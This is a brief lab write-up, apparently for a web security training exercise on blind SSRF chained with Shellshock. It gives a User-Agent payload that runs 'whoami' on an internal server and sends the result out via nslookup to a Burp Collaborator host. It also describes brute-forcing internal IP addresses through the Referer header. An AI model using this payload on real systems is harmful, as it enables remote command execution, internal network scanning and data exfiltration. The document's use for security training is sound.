### Blind SSRF with Shellshock exploitation
You need to supply payload in User-agent field. We will scan the port 8080 in 192.168.0/x. Also we will exfiltrate the name of OS user of internal server.
Vulnerable Parameter: Referer header
Install Colloborator Everywhere Extension
We need to add the appplication in Target Scope. Refresh the application and navigate to some pages you will get Collobarator pingback automatically.
In Issues it also shows that User-Agent and Referer header are the vulnerable parameters.
```
Payloads is:
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP_COLLABORATOR_HOSTNAME
Referer: http://192.168.0.1:8080
```
If port 8080 is open on 192.168.0.1 then it will ping the burp colloboarator server. Send the request to intruder and bruteforce the last digit of IP from 1 to 255.

